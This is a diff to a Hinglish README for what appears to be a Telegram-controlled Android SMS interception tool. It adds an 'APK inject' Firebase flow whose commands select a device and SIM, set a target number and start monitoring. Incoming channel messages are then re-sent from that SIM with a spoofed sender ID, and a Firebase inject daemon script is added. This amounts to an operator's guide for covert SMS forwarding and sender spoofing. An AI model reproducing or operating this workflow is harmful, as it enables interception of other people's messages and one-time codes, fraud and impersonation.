@@ -39,7 +39,17 @@ Bot tumhe device ka API key dega.
 **Option 2 — Auto add:**
 Jab bhi koi device SMS bhejti hai, wo automatically database mein add ho jati hai.
 
-**Monitor flow (recommended):**
+**Astik-style /key flow (Firebase + APK inject):**
+```
+/key https://base-e3797-default-rtdb.firebaseio.com   → License key set
+/fy <device_id>        → device select + SIM pick
+/addchannel            → channel connect
+/mynum 9876543210      → target number
+/startmonitor          → monitoring ON
+```
+Channel se aane wala SMS selected SIM se auto-send hoga (same sender ID spoof).
+
+**Monitor flow (server webhook):**
 ```
 /mynum 9876543210      → apna number set
 /startmonitar          → saare incoming SMS forward start
@@ -49,6 +59,7 @@ Jab bhi koi device SMS bhejti hai, wo automatically database mein add ho jati ha
 **Bot commands:**
 | Command | Kya karta hai |
 |---------|---------------|
+| `/key <firebase-url>` | License key set (Firebase URL ya KEY-XXXX) |
 | `/mynum 9876543210` | Apna SIM number set karo |
 | `/startmonitar` | Is number ke saare SMS forward |
 | `/stopmonitar` | Forwarding band karo |
@@ -208,6 +219,7 @@ curl -X POST "http://localhost:8000/api/sms?key=YOUR_API_SECRET_KEY" \
 │   └── config.py            # Settings
 ├── android/
 │   ├── sms_daemon.sh        # Superuser SMS reader (Termux)
+│   ├── firebase_daemon.sh   # Firebase /key inject daemon (APK-style)
 │   ├── install_termux.sh    # Phone-side installer
 │   └── termux_boot.sh       # Auto-start on reboot
 ├── install.sh               # Server installer (root-friendly)
